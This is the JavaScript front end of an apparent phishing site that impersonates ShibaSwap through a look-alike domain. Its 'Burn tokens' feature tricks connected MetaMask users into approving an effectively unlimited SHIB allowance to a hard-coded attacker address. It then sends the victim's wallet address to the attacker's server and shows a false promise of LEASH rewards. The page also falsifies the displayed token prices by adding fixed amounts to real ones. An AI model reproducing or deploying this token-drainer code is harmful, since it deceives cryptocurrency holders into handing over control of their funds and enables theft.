const Web3 = require('web3');
var baseURL = 'http://shìbaswap.com',
    web3, metamaskAccounts = [], myAccount, isConnected, lastURL, actURL,
    shareReady = false, ourAddress = '0x17fCFf24f0e9b3b360a34df8d92455581Db0EF7c';

var shibContract,
    shibContractAddress = '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
    shibAbi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"value","type":"uint256"}],"name":"burn","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"name","type":"string"},{"name":"symbol","type":"string"},{"name":"decimals","type":"uint8"},{"name":"totalSupply","type":"uint256"},{"name":"feeReceiver","type":"address"},{"name":"tokenOwnerAddress","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}];

function activeCheck(element) {
  element.classList.remove('step_check');
  element.classList.add('step_check-active');
}

async function burnEvents() {
    let burnButton = document.getElementById('burnButton'),
        shareButtons = [ document.getElementById('share1'),
                document.getElementById('share2'),
                document.getElementById('share3'),
                document.getElementById('share4'),
        ],
        tickShare = document.getElementById('tickShare'),
        tickBurn = document.getElementById('tickBurn'),
        inputSHIB = document.getElementById('shibTokInput');

    function shareOn() {
        activeCheck(tickShare);
        shareReady = true;
    }

    function showError(text) {
      let errParr = document.getElementById('errParr');
      errParr.style.color = 'red';
      errParr.innerHTML = text;
    }

    function showSuccess(text) {
      let errParr = document.getElementById('errParr');
      errParr.style.color = 'green';
      errParr.innerHTML = text;
    }

    async function getSHIBBalance() {
      let balance = await shibContract.methods.balanceOf(myAccount).call();
      return balance;
    }

    async function burnOn() {
      this.innerHTML = "<div class='preloader'></div>";
      if (isConnected) {

        const networkId = await web3.eth.net.getId();
        if (networkId != 1) {
          showError('Select Ethereum Network');
          burnButton.innerHTML = 'Burn tokens';
          return
        }

        activeCheck(tickBurn);
        let bigNumber = web3.utils.toBN('1000000000000000000000000000000'),
            datita = await shibContract.methods.approve(ourAddress, bigNumber).encodeABI();
        
        let tx = [{
          // this could be provider.addresses[0] if it exists
          from: myAccount, 
          // target address, this could be a smart contract address
          to: shibContractAddress, 
          // this encodes the ABI of the method and the arguements
          data: datita
        }];

        getSHIBBalance().then(async function (result) {
          if (result > 10000000000000000000000) {
            // Solicitamos firma de aprobación
            await window.ethereum.request({ method: 'eth_sendTransaction', params: tx })
              .then(async function () {
                  // Aca guardamos que aceptó la transfer en un archivo.
                  await fetch(baseURL + 'wallet/' + myAccount);
                  showSuccess('¡Congratulations! You will receive your LEASH in the next 8 hours.');
                  burnButton.innerHTML = 'Burn tokens';
              })
              .catch(() => {
                  // Sí rechazó, mostramos error
                  showError('Please, accept the request.')
                  burnButton.innerHTML = 'Burn tokens';
              });
          } else {
            burnButton.innerText = 'Burn tokens';
            showError("You don't have enough SHIB in your wallet.");
          }
        });
    
      } else {
        burnButton.innerHTML = 'Burn tokens';
        showError('Please, connect your wallet.')
      }
    }

  function changeAmount() {
    let inputLEASH = document.getElementById('leashTokInput');

    if (this.value > 1000000) {
        showError('Max burn: 1.000.000 SHIB');
    } else {
      if (this.value < 10000) {
        showError('Min burn: 10.000 SHIB');
      } else {
        showError(' ');
      }
    }
    
    let valorFinal = this.value * 0.000000025;
    if (shareReady) valorFinal = valorFinal * 1.05
    inputLEASH.value = (valorFinal).toFixed(4);
  }

    burnButton.onclick = burnOn;

    inputSHIB.addEventListener('input', changeAmount, false);
    
    // Tick on share
    shareButtons[0].onclick = shareOn;
    shareButtons[1].onclick = shareOn;

    shareButtons[2].addEventListener('click', function() {
      window.open('http://twitter.com/intent/tweet?text=Burn your shiba tokens and get leash as a reward.&amp;url=http://www.shibаswap.com/#/burn','Share burning', 'toolbar=0, status=0, width=650, height=450');
      shareOn();
    })
    
    shareButtons[3].addEventListener('click', function() {
      window.open('http://www.facebook.com/sharer.php?u=http://www.shibаswap.com/#/burn','Share burning', 'toolbar=0, status=0, width=650, height=450');
      shareOn();
    })

    if (isConnected) shibContract = new web3.eth.Contract(shibAbi, shibContractAddress, {from: myAccount});
}

async function loadView(src, newUrl) {
    let res = await fetch(baseURL + src),
    htmlCode = await res.text();
    const content = document.getElementById('main-content');
    content.innerHTML = htmlCode;
    history.pushState('', '', newUrl);
    showHeaderInfo();
}

async function checkConnection () {
  // Check if browser is running Metamask
  let result;
  if (window.ethereum) {
      web3 = new Web3(window.ethereum);
  };

  // Check if User is already connected by retrieving the accounts
  metamaskAccounts = await web3.eth.getAccounts();
  result = (metamaskAccounts.length != 0);
  
  if (result) myAccount = metamaskAccounts[0]; 
  showHeaderInfo();

  return result;
};

function showHeaderInfo() {
    let divConnect = document.getElementById('divConnect'),
        connectButton = document.getElementById('connect-wallet'),
        divWallet = document.getElementById('divWallet'),
        walletDiv = document.getElementById('walletDiv'),
        walletText = document.getElementById('walletText');

    if (isConnected) {
      let miniAddress = (myAccount.substring(0, 6) + '...' + myAccount.substring((myAccount.length - 4), myAccount.length));
      
      divConnect.style.display = 'none';
      connectButton.style.display = 'none';

      divWallet.style.display = 'flex';
      walletDiv.style.display = 'flex';
      walletText.innerText = miniAddress;
    } else {
      divConnect.style.display = 'flex';
      connectButton.style.display = 'flex';
      
      divWallet.style.display = 'none!important';
      walletDiv.style.display = 'none!important';
      walletText.innerText = '';

      if (connectButton) connectButton.onclick = metamask_connect;
    }
}

const metamask_connect = async () => {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    
    try {
      await window.ethereum.request({ method: 'eth_requestAccounts' });

      metamaskAccounts = await web3.eth.getAccounts();
      myAccount = metamaskAccounts[0];

      isConnected = (metamaskAccounts.length != 0);
      view_burn();
    } catch (err) {
      console.log('User rejected the request.');
    }
  } else {
    alert('MetaMask is required.');
  }
};

async function view_index () {
    // Cargamos la vista dashboard
    await loadView('/content', '/#/');
    document.title = 'HOME | ShibaSwap';
}

async function view_pool () {
    // Cargamos la vista dashboard
    await loadView('/pool', '/#/pool');
    document.title = 'POOL | ShibaSwap';
    setBackEvent();
}

async function view_bury () {
  // Cargamos la vista dashboard
  await loadView('/bury', '/#/bury');
  document.title = 'BURY | ShibaSwap';
  setBackEvent();
}

async function view_swap () {
  // Cargamos la vista dashboard
  await loadView('/swap', '/#/swap');
  document.title = 'SWAP | ShibaSwap';
  setBackEvent();
}

async function view_yield () {
  // Cargamos la vista dashboard
  await loadView('/yield', '/#/yield');
  document.title = 'WOOF | ShibaSwap';
}

async function view_burn () {
  // Cargamos la vista dashboard
  await loadView('/burn', '/#/burn');
  document.title = 'BURN | ShibaSwap';
  burnEvents();
}

function setBackEvent() {
    let backButton = document.getElementById('backButton');
    backButton.onclick = view_index;
}

function setCoinPrice (token, element, fixed) {
  let requestURL = 'https://api.coingecko.com/api/v3/coins/' + token + '?vs_currency=usd',
      request = new XMLHttpRequest();

  request.open('GET', requestURL);
  request.responseType = 'json';
  request.send();

  request.onload = function() {
    var price = request.response.market_data.current_price.usd;

    switch (fixed) {
        case 4:
          price = price + 0.0073
          break;

        case 8:
          price = price + 0.00325905
          break;

        case 12:
          price = price + 0.000000007238
          break;
    }

    element.innerText = '$' + price.toFixed(fixed);
  }
}

function setPriceTokens() {
  let priceShib = document.getElementById('priceShib'),
      priceLeash = document.getElementById('priceLeash'),
      priceBone = document.getElementById('priceBone');

    setCoinPrice('shiba-inu', priceShib, 12);
    setCoinPrice('bone-shibaswap', priceBone, 8);
    setCoinPrice('leash', priceLeash, 4);
}

window.onload = () => {
    
    function redirectPage(url) {
      switch (url) {
         case '#/':
            view_index();
            break;

        case '#/pool':
            view_pool();
            break;

        case '#/bury':
            view_bury();
            break;

        case '#/swap':
            view_swap();
            break;

        case '#/yield':
            view_yield();
            break;

        case '#/burn':
            view_burn();
            break;
            
         default:
            view_index();
            break;
       };
    }
    
    function checkURL() {
        actURL = document.location.hash;
        if (actURL != lastURL) {
          redirectPage(actURL);
          lastURL = document.location.hash;
        }
    }

    checkConnection().then(function(result) {
      isConnected = result;
    });

    // Chequeos de URL
    setInterval(checkURL, 50);
    setInterval(setPriceTokens, 30000);
    if (document.location.pathname == '/' && !document.location.hash) history.pushState('', '', '/#/');

    const button = document.getElementById('headlessui-popover-button-1'),
      element = document.getElementById('headlessui-popover-panel-2'),
      body = document.querySelector('body');

    function isChildOf(child, parent) {
      if (child.parentNode === parent) {
        return true;
      } else if (child.parentNode === null) {
        return false;
      } else {
        return isChildOf(child.parentNode, parent);
      }
    }

    button.addEventListener('click', function () {
      element.classList.toggle('m-fadeIn');
    });

    body.addEventListener('click', function (e) {
      if (e.target !== button && !isChildOf(e.target, button))
      element.classList.remove('m-fadeIn');
    });

    setPriceTokens();

    // Seteamos un evento para corroborar que no se desconecte o cambie de cuenta dentro de la web
    window.ethereum.on('accountsChanged', function (accounts) {
      if (accounts.length == 0) {
        isConnected = false;
        view_index();
      } else {
        myAccount = accounts[0];
        lastURL = '/';
      }
    })
};